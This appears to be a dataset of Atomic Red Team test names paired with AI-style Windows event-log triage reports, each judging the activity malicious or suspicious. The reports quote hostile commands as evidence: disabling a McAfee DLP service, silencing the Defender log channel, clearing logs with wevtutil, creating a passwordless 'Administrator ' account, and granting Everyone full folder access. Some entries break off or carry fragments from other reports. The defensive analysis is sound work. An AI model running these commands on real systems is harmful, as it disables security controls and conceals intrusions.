     - Windows PowerShell log cleared at `13:53:26.980`.
     - Security log cleared at `13:53:26.889`.
   - Clearing logs is a common tactic used by threat actors to cover their tracks after a malicious activity.

2. **Suspicious Command Execution:**
   - There is a sequence where `cmd.exe` is invoked with a command line that uses `mshta` to execute a PowerShell script (`powershell.ps1`) located in a temporary directory:
     ```plaintext
     ""cmd.exe"" /c mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.005\\src\\powershell.ps1"""""")
     ```
   - This sequence shows potential signs of a script-based attack, characterized by:
     - Utilization of `mshta.exe` to run JavaScript/VBScript, which can lead to executing arbitrary commands/scripts.
     - Execution of a PowerShell script in a local temporary directory often used by adversaries to run their payloads without detection.

3. **Time Manipulation:**
   - The `Microsoft-Windows-Kernel-General` log indicates the system time was changed, which might be an attempt to manipulate time logs or schedules:
     - The time was set back from `13:53:28` to `13:53:23`.

4. **High Integrity Level Processes:**
   - Many of the executed processes are running with High Integrity, Some are running with System integrity level. This may allow the processes to make significant changes to the system state.

5. **Edge Update Executions:**
   - There are multiple entries related to the execution of Microsoft Edge Update processes. While mostly benign, the context within the timeline and log clearing procedures raises suspicion about their legitimacy.

### Conclusion:

Based on the analysis, several indicators of potentially malicious activities are observed, especially concerning log clearing, suspicious script execution, and system time manipulation. 

**Resolution: MALICIOUS**

### Guidance:

- **Immediate Actions:**
  - Isolate the affected host (Server002) from the network to prevent further potential unauthorized activity.
  - Acquire full memory and disk images for deeper forensic analysis.
  - Review other logs, such as network logs and other endpoint protection logs, to identify any lateral movement or data exfiltration.

- **Further Investigation:**
  - Inspect the PowerShell script and any associated files for malicious code.
  - Inspect user actions: Investigate the ""admin_test"" user account to see if the behavior matches known behavior for that user.
  - Confirm the security posture of the Edge Update processes; ensure processes were not tampered with.

- **Preventive Measures:**
  - Implement strict access controls and logging permission checks to minimize log clearing by privileged users.
  - Configure alerting mechanisms for unusual log-clearing activities and abnormal command executions.
  - Regular security awareness training and periodic audits of user activities.

This resolution and guidance will help in addressing and mitigating the risk associated with the identified malicious activity."
Disable Arbitrary Security Windows Service,"In the provided Windows event logs, there are several indicators that suggest potentially malicious activity. The details are as follows:

1. **Event Clearing and Log Manipulation:**
   - **EventRecordID 17955 to 17994**: ""wevtutil.exe"" was used multiple times with the ""cl"" command-line option targeting the Sysmon, Application, System, and Security logs. This is indicative of log clearing, which is often performed by attackers to cover their tracks.
   - **EventID 1102 in Security Log** and **EventID 104 in System Log**: Indicates that the security and system logs were cleared by the user `admin_test`. This is an unusual activity for standard operations and is a common step in hiding malicious behavior.

2. **Service Stopping and Configuration Manipulation:**
   - **EventRecordID 17983 to 17989**: The command `cmd.exe /c net.exe stop McAfeeDLPAgentService & sc.exe config McAfeeDLPAgentService start= disabled` indicates an attempt to stop and disable McAfee DLP (Data Loss Prevention) service. This could be an attempt to bypass security controls, which is a typical tactic used by threat actors to evade detection and maintain persistence.

3. **Potential Privilege Abuse and Execution of Utilities:**
   - **High Integrity Level**: Many of the suspicious events, especially the manipulation operations and execution of administrative utilities, were run at a high integrity level by the user `SERVER002\admin_test`. This suggests potential privilege abuse, as these operations typically require administrative rights.

4. **Use of Built-in Windows Utilities:**
   - The execution of `hostname.exe` and `whoami.exe` indicates possible system reconnaissance activities, which are often part of the initial stages of an attack. These utilities are benign in normal usage but, in context with other activities such as log clearing and service manipulation, they could be part of a broader malicious campaign.

5. **Time Manipulation:**
   - **EventID 4616 in Security Log**: Identifies a system time change, which can be indicative of an attempt to bypass time-based security controls or logging. 

**Assessment:**
Considering the sequence of events and the types of actions performed, these logs collectively indicate that the activity on this host is indeed malicious. The clearing of logs, disabling of a security service (McAfeeDLP), and execution of reconnaissance commands are high-confidence indicators of a compromised system.

**Resolution: MALICIOUS**

**Guidance:**
- **Immediate Incident Response Actions**: Isolate the affected host from the network to prevent further potential spread or data exfiltration.
- **In-depth Forensic Analysis**: Perform a detailed forensic analysis of the host to identify signs of further compromise, persistence mechanisms, and potential data breaches.
- **Audit System Authentication and Privileged Account Use**: Review user accounts, especially `admin_test`, and validate the necessity of their access levels.
- **Monitoring and Log Review**: Increase monitoring for signs of similar activity in the environment and perform retrospective log analysis to understand the scope of the breach.
- **Review Security Controls**: Evaluate current security controls for gaps, particularly around logging and endpoint protection, and implement necessary enhancements."
LockBit Black - Disable the ETW Provider of Windows Defender -Powershell,"Based on the provided logs, I conducted a thorough analysis and identified the following key points that stand out as suspicious or potentially malicious activity:

1. **Event Log Clearing**:
   - The System and Windows PowerShell event logs were cleared by the user ""admin_test"" as evidenced by Event ID 104 in the System logs. Clearing event logs can be an indicator of malicious activity, as it might be an attempt to cover up tracks.

2. **PowerShell Command**:
   - A PowerShell command was executed to modify registry settings, particularly to disable a Windows Defender event log channel: `""HostApplication=powershell.exe & {New-ItemProperty ""HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" -Name Enabled -PropertyType DWord -Value 0 -Force}""`. This action is suspicious as it directly modifies security-related settings and may be used to hide activities from being logged.

3. **Sysmon Logs and Wevtutil Usage**:
   - Multiple instances of the `wevtutil.exe` command line utility were used to clear logs across different channels such as ""Sysmon"", ""Application"", ""System"", and ""Security"". This activity, along with the previously mentioned log clearing events, strongly indicates attempts to erase evidence of actions performed on the system.

4. **Time Manipulation**:
   - There are kernel events that indicate time changes in the system clock. Time manipulation can be a technique used to confuse log timelines and hinder forensic analysis.

Considering the above findings:

- The combination of log clearing, suspicious registry modifications via PowerShell, and potential attempts to manipulate system time clearly suggest that unauthorized and potentially malicious activities may have been performed on this system.
- These actions align with known tactics often employed in system breaches and intrusions to maintain persistence, avoid detection, and mask malicious activities.

**Assessment**:
Based on the evidence, I confidently categorize this incident as **MALICIOUS**. The actions observed within these logs display clear signs of malicious intent, potentially indicative of an unauthorized breach or an internal threat actor attempting to hide their activities.

   - Audit all accounts, especially focusing on the ""admin_test"" account, to verify any unauthorized access or privilege escalation.

3. **Security Enhancements**:
   - Strengthen logging and monitoring to detect similar activities in the future.
   - Implement more stringent access controls and consider revising administrative access policies.
  
4. **Incident Response**:
   - Follow incident response protocols to address and remediate the breach.
   - Notify relevant stakeholders and prepare a report for upper management and possibly law enforcement, depending on the nature and impact of the findings."
DLL Side-Loading using the dotnet startup hook environment variable,"### Analysis of Event Logs

Upon reviewing the provided Windows event logs, several activities suggest either suspicious behavior or potential signs of malicious intent.

#### Key Findings:

1. **Log Clearing:**
   - Multiple instances of logs being cleared using `wevtutil.exe` are observed in the logs. This action is often associated with malicious activity, as attackers commonly clear logs to hide traces of their actions.
   - The logs for the Security, System, and Windows PowerShell channels were cleared using `admin_test` user privileges. Event IDs 1102 (Security log), 104 (System log), and equivalent actions in the PowerShell and Sysmon logs indicate deliberate log clearing.

2. **Elevation and Execution:**
   - The use of `cmd.exe` with unusual command lines related to `DOTNET_STARTUP_HOOKS` suggests the presence of a potential DLL hijack attempt. This action is indicative of technique T1574.002 from the MITRE ATT&CK framework, related to hijacking dynamically linked libraries.
   - Executables like `MicrosoftEdgeUpdate.exe` and its related components show frequent executions with various parameters, potentially indicating misuse or an attempt to camouflage malicious activity within legitimate processes.

3. **Process Creation:**
   - Several processes, running under `NT AUTHORITY\SYSTEM`, executed without direct evidence of user activity. This includes `cmd.exe`, `wevtutil.exe`, and other system processes which, if not under the direct control of a system administrator, could indicate elevated privileges gained by an attacker.

4. **Suspicious Process Chains:**
   - The cascading use of processes such as `whoami.exe`, `hostname.exe`, and multiple `conhost.exe` instances suggests active reconnaissance or environment profiling by potentially malicious software.

#### Threat Assessment and Recommendations:

The presence of log clearing events combined with the execution of known system utilities in unusual contexts suggests an attempt to obscure actions and possibly maintain persistence or execute further actions under a privileged context.

1. **Resolution: MALICIOUS:** The systematic clearing of logs, careful execution of commands via PowerShell and `cmd.exe`, and the involvement with potential reconnaissance tools highlights a high likelihood of compromise.

2. **Immediate Actions:**
   - Isolate the affected host (`Server002`) from the network to prevent further potential spread or data exfiltration.
   - Conduct a thorough forensic investigation to identify any additional compromise or persistence mechanisms.
   - Audit access logs and privilege changes associated with the `admin_test` account to determine unauthorized access.

3. **Long-term Recommendations:**
   - Implement stricter monitoring of privileged account activities and any alterations to logs.
   - Enhance logging policies to include real-time monitoring and alerting of log clearing attempts and unauthorized command executions.
   - Strengthen endpoint security measures and ensure antivirus or EDR solutions are updated and capable of handling such threats. 

Taking these steps will enhance the security posture by addressing immediate threats and preventing similar incidents in the future."
Malicious process Masquerading as LSM.exe,"Upon reviewing the provided Windows event logs, I have identified several instances of potentially suspicious or malicious activity:

1. **Event Log Clearing:**
   - Multiple instances of log files being cleared are recorded across different channels like Security, System, and Windows PowerShell (Event ID 1102 in the Security log and Event ID 104 in the System log).
   - The clearing was performed by the user `admin_test` on `SERVER002`, which is typically indicative of an attempt to cover tracks after executing unauthorized actions.

2. **Use of `wevtutil.exe`:**
   - The logs contain multiple events indicating the execution of `wevtutil.exe`, a command-line utility for managing and querying event logs, with the command `cl` (clear logs), pointing to the direct clearing of logs. This action was executed by an account with high integrity levels, often seen in privilege abuse scenarios. 
   - System paths and command-line arguments clearly show that the command was used to clear logs, e.g., `wevtutil.exe cl Security`, `wevtutil.exe cl System`, and `wevtutil.exe cl ""Windows PowerShell""`.

3. **Suspicious Command Execution:**
   - An unusual command involves copying `cmd.exe` to `C:\\lsm.exe` and executing it with specific parameters, `& C:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt`. This represents the use of masquerading techniques to evade detection (Tactic T1036.003: Masquerading as Legitimate System File).
   - The command line indicates possible scripting activity that could be part of a broader attempt at evasive execution or persistence techniques.

4. **Credential Access Events:**
   - Event ID 5379 in the Security log shows multiple unsuccessful attempts to obtain credentials using the `WindowsLive` and `MicrosoftAccount:user=02txoixylodcstop`. These attempts returned with a `ReturnCode` of `3221226021`, suggesting failure in accessing or utilizing credentials. Though they failed, multiple attempts in quick succession might indicate attempts at unauthorized access.

**Summary and Resolution:**
- The combination of clearing logs, executing sensitive commands and scripts, and failed credential access attempts are strong indicators of potentially malicious activities aimed at evading detection and unauthorized access.
- These activities together increase the likelihood of a system compromise, perhaps as part of a persistence or lateral movement phase within a network.

Resolution: **MALICIOUS**

**Recommendations:**
- Immediate containment should be conducted by isolating the affected host to prevent further potential lateral movement.
- Conduct a thorough investigation to identify all unauthorized changes or access and initiate remediation steps, which include restoring logs where possible, and performing a comprehensive audit of user activities and system changes.

- Notify relevant stakeholders and legal teams if necessary, along with implementing a full recovery and post-incident analysis for improved future resilience."
Flush Shimcache,"After a careful analysis of the Windows event logs, several activities stand out that could indicate suspicious or potentially malicious behavior:

1. **Event Log Clearing (Event ID 1102 & 104):**
   - The security logs and event logs being cleared (Event ID 1102 in the security log and Event ID 104 in the system log) can be a strong indicator of malicious activity. Malicious actors often clear logs to cover their tracks and prevent detection. The logs show multiple log clear events executed by the user `admin_test`.

2. **Suspicious Use of `wevtutil.exe`:**
   - Multiple instances of the `wevtutil.exe` command being executed, particularly with the `cl` (clear) command, were observed. This utility is typically used for managing event logs and clearing logs, which aligns with the log clearing events mentioned.
   - The `wevtutil.exe` commands were executed from a high integrity level and the current directory was `C:\Users\admin_test\Documents\`, which is unusual for a system utility and further suggests unauthorized or suspicious use.

3. **Unusual Use of Command-line Tools:**
   - The use of `cmd.exe` with the `Rundll32.exe apphelp.dll,ShimFlushCache` argument could potentially indicate suspicious behavior, as this pattern can sometimes be leveraged for persistence or privilege escalation attacks.
  
4. **Execution Context:**
   - The processes were executed by the user `SERVER002\admin_test` with a high integrity level, raising concerns about unauthorized or escalated privileges being used for potentially malicious purposes.

5. **Repetitive Process Creations for Microsoft Edge Update:**
   - Numerous instances of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) being spawned rapidly could indicate a normal update process; however, it should be verified whether this aligns with expected updates during the given timeframe.
   
Upon evaluating these indicators, the activity described above is highly suggestive of malicious intent, especially given the combination of event log clearing and suspicious command-line executions.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Isolate the Host:** Immediately isolate the affected machine (Server002) from the network to prevent further potential spread or damage.
2. **Further Investigation:**
   - Conduct a thorough review of user `admin_test` activities and credentials.
   - Investigate why `wevtutil.exe` was run from an unusual directory.
   - Review system and security policies to ensure processes running with high integrity levels are legitimate.

Terminal Server Client Connection History Cleared,"Based on the analysis of the provided Windows event logs, here are the observations and conclusions:

1. **Event Log Clearing**:
   - Entries in the System log indicate that multiple event logs (System and Windows PowerShell) were cleared by the user `admin_test` at timestamp ""2024-10-24 16:39:20.4446300"". These activities are captured under Event ID 104, which corresponds to the clearing of event logs.
   - In the Security log, Event ID 1102 indicates that the security log was cleared by the same user, `admin_test`, at timestamp ""2024-10-24 16:39:20.5173864"". 
   - Clearing event logs can often be indicative of attempts to cover tracks after executing potentially malicious activities, thus warranting extra attention.

2. **Suspicious Command Execution**:
   - There are Sysmon entries showing the execution of `cmd.exe` with a command line that deletes registry entries related to Remote Desktop connections, such as:
     ```
     ""cmd.exe"" /c reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"" /va /f & reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"" /f
     ```
   - The deletion of these registry keys can be a step to remove traces of Remote Desktop Protocol (RDP) connections, raising suspicion about unauthorized remote sessions or potential policy violations.

3. **Processes and Services**:
   - Legitimate processes like `wevtutil.exe`, `powershell.exe`, `conhost.exe`, and various components of Microsoft Edge Update were executed. These processes, in the absence of any unusual parameters or behaviors, generally align with normal system or application maintenance activities.
   - `MicrosoftEdgeUpdate.exe` and related services ran frequently, which is expected during automatic update checks and installations.

**Conclusion**:
Given the combination of event log clearing and suspicious registry key deletions involving RDP settings, these indicators point towards potentially unauthorized activity on the host.

**Resolution**: **SUSPICIOUS** – While there's no definitive proof of malicious intent, the actions of clearing event logs and the command to delete RDP registry keys are suspicious and warrant further investigation. It is crucial to review user `admin_test` activity logs comprehensively, check for unauthorized access attempts, and ensure regular monitoring to prevent any possible compromise. Additional scrutiny of network activity from this host, as well as user behavior analytics, would be advisable."
Running DLL with .init extension and function,"Upon analyzing the provided Windows event logs, several indicators suggest suspicious or potentially malicious activities:

1. **Log File Clearing:**
   - In the system logs, events show that log files were cleared (`EventID: 104`) for both the System and Windows PowerShell logs. This action was performed by a user named `admin_test`.
   - In the security log, there is an event (`EventID: 1102`) indicating that the security log was cleared by the same user `admin_test`.

   Clearing of log files can be indicative of an attempt to conceal malicious activity, especially when done without prior notice or justification.

2. **Unusual Rundll32 Execution:**
   - The PowerShell log shows various events (`EventID: 600`) linked to the execution of a PowerShell command using `rundll32.exe` with a path referencing the Atomic Red Team tool under `T1218.011`, which is a known MITRE ATT&CK technique for abuse of `rundll32`.
   - The Sysmon log supports this by showing `rundll32.exe` processes initiated from `cmd.exe`, which itself was executed under the user `admin_test`.

   `Rundll32.exe` is being executed with what appears to be non-standard or test utilities, suggesting the possible execution of code under the guise of normal system processes. This pattern can be commonly seen in evasion techniques.

3. **Event Utility and PowerShell Activities:**
   - Multiple instances of the execution of `wevtutil.exe` (Event Log management utility) are documented in the Sysmon logs, corresponding to actions clearing various event logs (Sysmon, System, Application, Security).
   - The `wevtutil.exe` commands to clear logs are executed with a high integrity level, which indicates potential privilege misuse.

   The combination of command-line executions related to event log clearing and PowerShell processes with high privileges directed by a single user suggests potential pre-emptive activities to cover tracks following unauthorized activity.

Assessment and Resolution:

- **Threat Level:** SUSPICIOUS
- **Resolution:** The activities observed are not conclusively malicious but represent significant red flags. The clearing of event logs, especially across multiple log sources simultaneously, along with the execution of programs known for their use in attack simulation and malicious conduct (e.g., `rundll32` with scripts from Atomic Red Team), necessitates further investigation.
  
**Guidance on How to Proceed:**
1. Conduct an in-depth investigation into the user `admin_test` to determine if these actions were authorized or part of any known administrative tasks.
2. Check for any additional log activity on the systems involved during the same timeframe to gather more context.
3. Review any changes in user permissions or privilege alterations, especially those surrounding this account.
4. Ensure network and host-level monitoring is increased to capture any further suspicious patterns linked to this account or machine.

Execution from Compressed JScript File,"### Detailed Analysis of Logs:

#### Suspicious or Anomalous Behavior:

1. **Event Log Clearing**:
   - **System Log: Event ID 104 and Security Log: Event ID 1102**:
     - Logs indicate that the event logs for ""System"", ""Windows PowerShell"", and ""Security"" channels were cleared by user `admin_test`.
     - The use of `wevtutil.exe` (Eventing Command Line Utility) is common for event log clearing operations.
     - Event clearing, especially across multiple critical logs and under privileged account, is a strong indicator of potential log tampering or malicious activity to hide trace.

2. **Unusual Command Execution**:
   - **Sysmon Log: Execution of WScript with JavaScript file**:
     - Process `cmd.exe` executed a script `T1027js.js` located in a non-standard path `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\ExternalPayloads\\temp_T1027js.zip\\t1027js.js""`.
     - The use of script files, especially JavaScript being executed by `wscript.exe`, in a temp directory can indicate potential fileless threat or script execution for malicious purposes.

3. **Use of Atomic Red Team Tool**:
   - Reference to the path within `AtomicRedTeam` suggests that the host has been subjected to manual or automated security testing or potentially offensive security tool usage. This action could either be legitimate testing or an attempt by an attacker to exploit vulnerabilities.
   
#### Indicators of Malicious Activity or Compromise:

- The sequence of clearing event logs (`wevtutil.exe cl`) executed shortly after the execution of a suspicious script (`T1027js.js`) suggests an attempt to cover tracks post-exploitation or test.
  
- **PowerShell Execution**: The presence of running PowerShell with admin privileges is typical in both administrative and malicious contexts. 

- **High Integrity Level Processes**: Most processes like `wevtutil.exe`, `cmd.exe`, `wscript.exe` observed in the logs are running at high integrity levels, which ensures that they have administrative access, potentially dangerous if misused with malicious intent.

### Conclusion:

**Resolution**: **MALICIOUS**

The presence of log clearing activities, combined with the execution of a suspicious script in a temporary directory via command line, points strongly to attempts to obscure malicious actions, indicating a very high potential of compromise. It's important to ensure these activities are not legitimately scheduled penetration tests or internal security assessments by verifying with the respective teams.

### Guidance on How to Proceed:

1. **Immediate Response**: 
   - Contain the affected host to prevent any further suspicious activity and potential lateral movement within the network.
   - Conduct a full forensic analysis to determine the extent of the compromise and to identify any payloads or secondary infections.

Office 365 - Exchange Audit Log Disabled,"Upon reviewing the provided logs from the Windows host, several noteworthy activities and potential areas of concern need to be addressed:

1. **Event Log Clearance:**
   - The ""System"", ""Windows PowerShell"", and ""Security"" event logs have been cleared around the same time (`12:34:51.7247454` - `12:34:51.8534065`). Event log clearing can be a tactic used by malicious actors to hide their tracks, especially if it is performed by a user account (`admin_test`) with high privileges.

2. **PowerShell Activity:**
   - There is a series of PowerShell activities recorded with the command attempting to connect to `Exchange Online` using `$secure_pwd = """" | ConvertTo-SecureString -AsPlainText -Force`. This command is improperly handling credentials since using an empty secure string is unusual and potentially indicative of malicious scripting or credential abuse.
   - PowerShell command is also attempting to modify audit log configurations, which can be an indicator of efforts to suppress logging of certain activities.

3. **Sysmon Log Observations:**
   - Multiple executions of `wevtutil.exe` (Event ID 1) clearing various logs, e.g., `Sysmon`, `Application`, `Security`, and `Windows PowerShell`.
   - A series of processes executed involving conhost, wevtutil, and PowerShell, all being initiated by the same user `SERVER002\admin_test`.
   - Repeated logon by system processes, such as those tied to CompTelRunner, suggests an automated task or initialization, but being tied closely to the time of log clearance exacerbates suspicions.

4. **Security Event Anomalies:**
   - Event 4798 repeatedly querying for user information, triggered by `CompatTelRunner.exe`, raises the question of why a telemetry process would need access to such data. While this is associated with legitimate telemetry collection, the timing and volume could be queried further to assure they align with known system processes.

### Assessment:
The sequence and type of logged activities are highly suspicious. The clearing of logs and specific command-line actions around sensitive data management suggest potential malicious activities, possibly by an insider or a compromised account.

### Resolution:
**MALICIOUS** - The logs contain indicators of possibly malicious actions, specifically focusing on log tampering and questionable PowerShell use. Immediate follow-up should involve:
- Conducting a detailed forensic investigation to determine the source of the suspicious activities.
- Reviewing user access controls and monitoring additional unusual account activities, particularly for `admin_test`.
- Verifying that the PowerShell commands and system tasks are in alignment with any authorized activities.
- Restoring cleared event logs from backup if available, to reconstruct full sequence of activities.

### Next Steps:
- Quarantine the system if further suspicious activity is promptly detected.
- Validate if any critical data has been accessed or tampered with during these activities.
- Implement additional security controls, such as more rigorous logging, alerting for elevated privileges activities, and hardening PowerShell execution policies."
Event Log Manipulations- Time slipping via Powershell,"Upon careful review of the provided Windows event logs, we can identify several key activities and timestamps that indicate suspicious behavior possibly indicative of malicious activity:

### Suspicious and Anomalous Behaviors:

1. **Clearing of Event Logs**:
    - Multiple logs in the Security, System, and PowerShell channels were cleared by the user `admin_test`. This is typically a red flag for malicious activity, as attackers often clear logs to cover their tracks after compromising a system.

2. **Time Manipulation**:
    - The use of PowerShell to change the system date (`Set-Date -Date (Get-Date).AddDays(3)`) and creation of a file named `slipDays.bak` within the user’s AppData path suggests an attempt to obfuscate activities by altering timestamps. This behavior is strongly associated with attempts to confuse forensic analysis and can be used to defeat time-related security measures or hide illicit activities.

3. **High Integrity Level Processes**:
    - Command executions via `wevtutil.exe` by `admin_test` to clear logs (e.g., `cl Security`, `cl Windows PowerShell`). These actions were executed with high integrity levels, indicating elevated privileges.

4. **Unusual PowerShell Execution**:
    - PowerShell is invoked with a script that alters system time and writes to an external file. Although the command itself isn’t inherently malicious, its context (following log clearings) flags it as suspicious behavior.

### Assessment:

- **Log Clearances and Timestamp Modification**: The clearing of log files and time modifications are common post-exploitation behaviors used to maintain persistence, escalate privileges, or just obfuscate tracks.
- **Presence of Admin Privileges**: Actions were carried out by an account with administrative privileges (`admin_test`), including executing processes with high-integrity levels which signals potential privilege abuse or compromise.
  
### Resolution and Guidance:

- **Resolution**: **MALICIOUS**
  - The combination of log clearing, time manipulation, and administrative-level changes strongly indicates an intrusion attempt or ongoing malicious activity. 

### Recommendations:

1. **Immediate Incident Response**:
    - Begin a full incident response process, including isolating the affected system(s) to prevent further potential damage or ingress.
    - Preserve all relevant logs and data for forensic analysis to understand the scope and vectors of the attack.

2. **Comprehensive Audit**:
    - Audit all user accounts, especially those with administrative privileges, to ensure they have not been compromised.
    - Evaluate network security measures to identify and close any vulnerabilities exploited during this incident.

3. **Further Investigation**:
    - Conduct a thorough forensic analysis to determine how attackers gained access, potential escalation vectors, and any data exfiltration.
    
4. **Remediation Steps**:
    - Reset passwords for `admin_test` and other accounts with elevated privileges.
    - Review and strengthen endpoint protection, logging, and monitoring configurations.
  
By recognizing these patterns and acting swiftly, it may be possible to mitigate the damage and prevent further malicious activities."
Grant Full Access to folder for Everyone - Ryuk Ransomware Style,"Upon analyzing the provided logs, there are several key findings:

1. **System Time Changes**: There are multiple entries in the Security and System logs indicating changes to the system time. Event ID 4616 in the Security log and Event ID 1 in the System log reflect these changes. Time changes can be legitimate; however, they are sometimes utilized by attackers to hide their tracks or manipulate time-based security protocols.

2. **Log Clearing**: There are entries in both the System and Security logs referring to the clearing of logs. Specifically, Event ID 1102 in the Security log and Event ID 104 in the System log indicate that logs were cleared by a user named ""admin_test"". Clearing logs is a common tactic used by attackers to erase evidence of their activity.

3. **Suspicious Command Execution**: In the Sysmon logs, there is an entry for the execution of `cmd.exe` with a command line that includes `icacls` to grant full access to Everyone on the `C:\Users\Public\` directory. The use of `icacls` to change permissions across a broad directory with /T, /C, /Q flags could indicate an attempt to open up permissions or prepare for data exfiltration or further malicious activity.

4. **Background Software Updates**: There are multiple entries related to Microsoft Edge updates. While these updates appear to be legitimate, the frequency and timing of the updates, especially when seen alongside the above findings, warrant further investigation to confirm they are not leverage points for malicious code.

In summary, these logs display behavior that is indeed suspicious:

- The clearing of system and security logs coupled with system time changes might suggest an attempt to cover tracks.
- Execution of commands altering file permissions extensively is atypical and often aligned with malicious actions aimed at gaining broader file access.
  
Based on these observations:
- **Resolution: SUSPICIOUS**

**Guidance on Proceeding**:
- Escalate this matter for a deeper investigation.
- Review network activity around the timeframe of suspicious actions for evidence of data exfiltration or communication with malicious actors.
- Conduct a thorough check on the affected system for malware or unauthorized changes.

   - Many processes, including PowerShell and `wevtutil.exe`, are executed with high integrity levels, suggesting potential privilege escalation or use of administrative rights for unauthorized purposes.

6. **Microsoft Edge Update Processes:**
   - A significant portion of the logs involve Microsoft Edge Update processes, which appear typical due to their origin and nature. However, initial investigations should ensure that these updates are legitimate and verified by Microsoft to rule out masquerading malware.

### Assessment

Based on the logs provided:
- The clearing of logs, adjusting system time, and registry changes without clear network or policy justification suggests potential cover-up activities and escalation attempts.

### Resolution: **SUSPICIOUS**

While direct evidence of compromise like malware execution is not present, the combination of system time alterations, log clearing, and registry modifications without verified administrative tasks necessitates further investigation. Focus on verifying the identity of `admin_test`, potential unauthorized access to this account, and a review of recent activities or changes in the system.

### Guidance on How to Proceed

1. **Verify Administrative Actions:**
   - Confirm that the actions taken by `admin_test` are authorized and align with organizational policies. If unauthorized, consider this account as potentially compromised.
   
2. **Examine Detailed Context:**
   - Investigate if there are logs or evidence from other monitoring tools that provide more context around these events, including network logs, additional endpoint security alerts, or user activity monitoring.

3. **Review Audit Settings:**
   - Ensure that forensic auditing is correctly enabled and that appropriate alerts exist for such activities in the future to facilitate quicker identification.

4. **Conduct a System Integrity Check:**
   - Run thorough endpoint security checks on `Server002` to identify potential malware presence and confirm the integrity of system files and configurations."
Delete System Logs Using Clear-EventLog,"Upon analyzing the provided Windows event logs, several suspicious activities have been identified which indicate potential malicious behavior:

1. **Log Clearing Activity:**
   - Multiple logs, including System, Windows PowerShell, and Security, were cleared by the user `admin_test`. This is usually an indicator of hiding activities to cover tracks after a malicious operation has been performed. 
   - Specifically, log entries with Event ID 104 (`LogFileCleared`) and 1102 (`Audit Log Cleared`) show evidence of this activity.

2. **Unusual Use of PowerShell:**
   - A PowerShell process with the command `Clear-EventLog` was executed by the user `admin_test`, which correlates with the timestamps of the log clearing events.
   - The command involved iterating over event logs and clearing them, which aligns with typical behavior seen in an attack scenario aiming to maintain persistence and hide actions.

3. **Time Change Entries:**
   - There are Event ID 4616 logs related to time manipulation (`PreviousTime` and `NewTime`). Although time adjustments can occur naturally due to synchronization, the close proximity in time to log clearing could be suspicious if it's unscheduled and unexplained.

4. **Suspicious Process Executions:**
   - The execution of `whoami.exe`, `wevtutil.exe`, and other system utilities in rapid succession by an administrative user might be indicative of reconnaissance or scripting operations typically used in an attack.

5. **Integrity Level:**
   - The processes in question were executed with a high integrity level, indicating administrative privileges were used, which adds a level of risk to this scenario, given the actions performed.

Given these observations, the logs suggest a potential scenario where an attacker might have gained administrative access and attempted to cover their tracks by clearing security event logs using PowerShell. These activities are typical indicators of malicious intent.

**Resolution:** MALICIOUS

**Guidance:**
- Conduct a thorough forensic investigation to assess potential damages and establish the scope of the intrusion.
- Review user access controls, particularly for the user `admin_test`.
- Strengthen security measures, including enhanced monitoring of PowerShell activities and implementing Sysmon for better process visibility.
- Consider refreshing credentials and strengthening password policies to prevent unauthorized access in the future."
Create an Administratoruser (with a space on the end),"After thoroughly analyzing the provided event logs, here is a detailed breakdown of the key findings and assessment of potential threats:

### Indicators of Malicious Activity:

1. **Clearing of Event Logs:**
    - The event logs reveal that several logs have been cleared, as indicated in both the System and Security logs.
    - Application Log clearing entry at `2024-10-28 13:01:29`.
    - Security Log clearing entry at `2024-10-28 13:01:29`.
    - System Log clearing entry at `2024-10-28 13:01:29`.

2. **Suspicious PowerShell Activity:**
    - A PowerShell command was executed to create a new local user with the name ""Administrator "", notably without a password.
    - Event IDs `17976` and  `600` and others related to PowerShell in the logs depict the command: `""powershell.exe"" & {New-LocalUser -Name \""Administrator \"" -NoPassword}`.
    - This action suggests potential unauthorized user creation for backdoor access.

3. **Time Change:**
    - There are events indicating that the system time was changed around `13:01:29`. 
    - Event IDs `30355` and `30356` in the Security log indicate time adjustments. This could attempt to obscure timestamps related to the malicious activity.

4. **Logon and Privilege Escalation:**
    - Security logs with Event IDs `4720`, `4722`, and `4738` demonstrate the creation and subsequent modification of accounts, which is common in privilege escalation attacks.

### Assessment:

Given the sequence of events, the creation of an ""Administrator "" user account without a password using PowerShell, coupled with the clearing of event logs and time modifications, present strong cases of system compromise. These activities are classic indicators of unauthorized privilege escalation and attempts to cover tracks.

### Resolution:
- **MALICIOUS**: The logs contain clear evidence of malicious activity.

### Recommendations for Further Actions:
- **Immediate Investigation**: Conduct a comprehensive forensic analysis of the host system to determine the extent of the breach.
- **Review and Restore Logs**: Attempt to recover any cleared logs to determine if further malicious activities were recorded.
- **Isolation**: Consider isolating the affected server from the network to prevent further spread or exfiltration of data.
- **User Review**: Review all user accounts, especially newly created ones, and assess any unauthorized access or privilege changes.
- **Patch and Update**: Ensure all systems are up-to-date with the latest patches, especially those related to Windows and PowerShell security.
- **Security Enhancements**: Implement stricter PowerShell execution policies and auditing. Enhance monitoring for suspicious activities such as log clearance and unauthorized user account changes."
Masquerade as a built-in system executable,"After reviewing the provided Windows event logs, several observations can be made regarding potential indicators of malicious activity:

1. **PowerShell Logs:**
   - Multiple events (Event ID 600) show the use of PowerShell to compile a C# code using `Add-Type` and execute the compiled code as a new process (`svchost.exe`) from the Windows temporary directory (`C:\\Windows\\Temp\\svchost.exe`). This behavior is highly suspicious as it resembles techniques often used by attackers to run arbitrary code.
   - The use of `svchost.exe` as a file name in a non-standard directory is unusual, as `svchost.exe` is a legitimate Windows process typically located in the `C:\\Windows\\System32\\` directory. Running it from another location can indicate an attempt to evade detection or impersonate legitimate processes.

2. **Sysmon Logs:**
   - Event logs indicate the execution of the suspicious `svchost.exe` compiled and executed from the Temp directory by PowerShell.
   - Various system utilities (like `wevtutil.exe`, `conhost.exe`, `whoami.exe`) are executed by the same user (`SERVER002\\admin_test`). While some actions may be part of legitimate administration tasks, the context here, combined with the PowerShell events, is concerning.

3. **System Log:**
